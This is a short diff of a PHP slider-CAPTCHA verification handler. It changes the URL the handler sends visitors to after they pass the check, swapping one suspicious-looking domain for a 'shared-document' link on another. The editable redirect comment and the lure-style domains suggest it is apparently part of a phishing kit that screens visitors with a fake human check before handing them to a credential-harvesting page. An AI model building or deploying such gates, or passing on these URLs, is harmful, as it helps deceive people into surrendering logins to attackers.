@@ -181,7 +181,7 @@ if ($action === 'verify') {
     $diff = $storedX - $sliderX;
     if ($diff >= -5 && $diff <= 5) {
         // ===== CHANGE YOUR REDIRECT URL HERE =====
-        $redirectURL = 'https://asvo0onoak.rillenrisc.pics/';
+        $redirectURL = 'https://shared-document.parapintaraloleo.com/oQMxz';
         echo json_encode(array('status' => 'success', 'redirect' => $redirectURL));
     } else {
         echo json_encode(array('status' => 'error', 'message' => 'Incorrect position. Try again.'));
